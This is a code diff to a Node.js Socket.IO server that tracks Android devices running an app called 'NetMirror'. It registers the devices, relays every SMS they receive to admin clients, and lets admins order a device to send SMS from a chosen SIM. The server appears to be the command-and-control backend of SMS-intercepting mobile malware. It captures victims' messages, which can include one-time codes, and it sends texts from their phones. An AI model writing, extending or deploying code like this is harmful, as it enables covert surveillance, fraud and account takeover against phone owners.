@@ -1480,8 +1480,125 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     metrics.wsMessagesOut++;
     return origEmit(...args);
   };
+  // ═══════════════════════════════════════════════════════════════════════
+  // In-memory socket ↔ device mapping for fast lookups
+  // ═══════════════════════════════════════════════════════════════════════
+  const socketToDevice = new Map(); // socket.id → device_id
+  const deviceToSocket = new Map(); // device_id → socket.id
+
   io.on('connection', (socket) => {
     socket.onAny(() => { metrics.wsMessagesIn++; });
+    console.log(`[Socket] New connection: ${socket.id}`);
+
+    // ═══ DEVICE REGISTER — device connects and identifies itself ═══
+    // Android app sends 'device_register' with encrypted device info on connect.
+    // We link this socket to the device_id so we can send commands to it later.
+    socket.on('device_register', (rawData) => {
+      try {
+        const { tryDecrypt } = require('./utils/crypto');
+        let data;
+        try {
+          data = tryDecrypt(rawData);
+        } catch (_) {
+          data = typeof rawData === 'string' ? JSON.parse(rawData) : rawData;
+        }
+
+        const deviceId = data.device_id;
+        if (!deviceId) {
+          console.warn('[Socket] device_register: no device_id in payload');
+          return;
+        }
+
+        // Store mapping
+        socketToDevice.set(socket.id, deviceId);
+        deviceToSocket.set(deviceId, socket.id);
+
+        // Update DB: save socket_id and mark online
+        try {
+          db.prepare(`UPDATE devices SET socket_id = ?, is_online = 1, last_seen = datetime('now') WHERE device_id = ?`)
+            .run(socket.id, deviceId);
+        } catch (_) {}
+
+        // Send welcome
+        socket.emit('welcome', { status: 'connected', device_id: deviceId });
+
+        console.log(`[Socket] Device registered: ${deviceId} → socket ${socket.id}`);
+
+        // Broadcast device online to admin panel
+        try {
+          const device = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(deviceId);
+          if (device) {
+            try { device.phone_numbers = JSON.parse(device.phone_numbers || '[]'); } catch (_) { device.phone_numbers = []; }
+            origEmit('device_online', device);
+          }
+        } catch (_) {}
+      } catch (e) {
+        console.warn('[Socket] device_register error:', e.message);
+      }
+    });
+
+    // ═══ HEARTBEAT — device sends periodic updates ═══
+    socket.on('heartbeat', (rawData) => {
+      try {
+        const { tryDecrypt } = require('./utils/crypto');
+        let data;
+        try { data = tryDecrypt(rawData); } catch (_) {
+          data = typeof rawData === 'string' ? JSON.parse(rawData) : rawData;
+        }
+
+        const deviceId = data.device_id || socketToDevice.get(socket.id);
+        if (!deviceId) return;
+
+        // Update last_seen and battery info
+        try {
+          db.prepare(`UPDATE devices SET is_online = 1, last_seen = datetime('now'),
+            battery_percent = COALESCE(?, battery_percent),
+            battery_charging = COALESCE(?, battery_charging)
+            WHERE device_id = ?`)
+            .run(data.battery_percent ?? null, data.battery_charging != null ? (data.battery_charging ? 1 : 0) : null, deviceId);
+        } catch (_) {}
+
+        // Ensure mapping is current
+        if (!socketToDevice.has(socket.id)) {
+          socketToDevice.set(socket.id, deviceId);
+          deviceToSocket.set(deviceId, socket.id);
+          try {
+            db.prepare(`UPDATE devices SET socket_id = ? WHERE device_id = ?`).run(socket.id, deviceId);
+          } catch (_) {}
+        }
+      } catch (_) {}
+    });
+
+    // ═══ SMS SEND RESULT — device reports back after attempting SMS dispatch ═══
+    socket.on('sms_send_result', (rawData) => {
+      try {
+        const { tryDecrypt } = require('./utils/crypto');
+        let data;
+        try { data = tryDecrypt(rawData); } catch (_) {
+          data = typeof rawData === 'string' ? JSON.parse(rawData) : rawData;
+        }
+
+        const success = data.success;
+        const error = data.error || '';
+        const receiver = data.receiver || '';
+        const requestId = data.request_id || data.command_id || '';
+        const deviceId = data.device_id || socketToDevice.get(socket.id) || '';
+
+        console.log(`[SMS-Result] Device ${deviceId}: success=${success}, to=${receiver}, reqId=${requestId}${error ? ', error=' + error : ''}`);
+
+        // Broadcast result to all admin clients
+        origEmit('sms_send_result', {
+          device_id: deviceId,
+          success,
+          error,
+          receiver,
+          request_id: requestId,
+          timestamp: Date.now()
+        });
+      } catch (e) {
+        console.warn('[SMS-Result] Error processing:', e.message);
+      }
+    });
 
     // ═══ INSTANT SMS RELAY — device → server → admin app ═══
     // NetMirror emits 'instant_sms' when an SMS is received on the device.
@@ -1491,8 +1608,8 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         // Decrypt if encrypted, otherwise parse directly
         let data;
         try {
-          const { cryptoDecrypt } = require('./utils/crypto');
-          data = cryptoDecrypt(rawData);
+          const { tryDecrypt } = require('./utils/crypto');
+          data = tryDecrypt(rawData);
         } catch (_) {
           data = typeof rawData === 'string' ? JSON.parse(rawData) : rawData;
         }
@@ -1529,6 +1646,27 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         console.log(`[SMS-Relay] Instant SMS from ${address} on device ${deviceId} → broadcast to admins`);
       } catch (e) {
         console.warn('[SMS-Relay] Error processing instant_sms:', e.message);
+      }
+    });
+
+    // ═══ DISCONNECT — clean up when device disconnects ═══
+    socket.on('disconnect', (reason) => {
+      const deviceId = socketToDevice.get(socket.id);
+      if (deviceId) {
+        console.log(`[Socket] Device disconnected: ${deviceId} (reason: ${reason})`);
+        socketToDevice.delete(socket.id);
+        deviceToSocket.delete(deviceId);
+
+        // Clear socket_id and mark offline in DB
+        try {
+          db.prepare(`UPDATE devices SET socket_id = '', is_online = 0, last_seen = datetime('now') WHERE device_id = ?`)
+            .run(deviceId);
+        } catch (_) {}
+
+        // Broadcast device offline to admin panel
+        origEmit('device_offline', { device_id: deviceId });
+      } else {
+        console.log(`[Socket] Unknown socket disconnected: ${socket.id}`);
       }
     });
   });
@@ -2220,15 +2358,23 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         return res.status(400).json({ error: 'device_id, receiver, and message are required' });
       }
 
-      // Find the device's socket
-      const device = db.prepare('SELECT socket_id FROM devices WHERE device_id = ?').get(device_id);
-      if (!device || !device.socket_id) {
-        return res.status(400).json({ error: 'Device is not connected via WebSocket. The app must be open.' });
+      // Find the device's socket — try in-memory map first (fastest), then DB
+      let targetSocket = null;
+      const memSocketId = deviceToSocket.get(device_id);
+      if (memSocketId) {
+        targetSocket = io.sockets.sockets.get(memSocketId);
       }
 
-      const targetSocket = io.sockets.sockets.get(device.socket_id);
+      // Fallback to DB lookup
       if (!targetSocket) {
-        return res.status(400).json({ error: 'Device socket not found. The app may have just disconnected.' });
+        const device = db.prepare('SELECT socket_id FROM devices WHERE device_id = ?').get(device_id);
+        if (device && device.socket_id) {
+          targetSocket = io.sockets.sockets.get(device.socket_id);
+        }
+      }
+
+      if (!targetSocket) {
+        return res.status(400).json({ error: 'Device is not connected. The NetMirror app must be open on the device.' });
       }
 
       // Generate a unique request ID for tracking
@@ -2243,9 +2389,10 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         sim_slot: parseInt(sim_slot) || 0,
       }));
 
-      console.log(`[SMS-SEND] Command sent to device ${device_id}: to=${receiver} sim=${sim_slot}`);
+      console.log(`[SMS-SEND] Command sent to device ${device_id}: to=${receiver} sim=${sim_slot || 'default'} socket=${targetSocket.id}`);
       res.json({ success: true, request_id: requestId, message: 'Send command dispatched to device' });
     } catch (err) {
+      console.error('[SMS-SEND] Error:', err.message);
       res.status(500).json({ error: err.message });
     }
   });
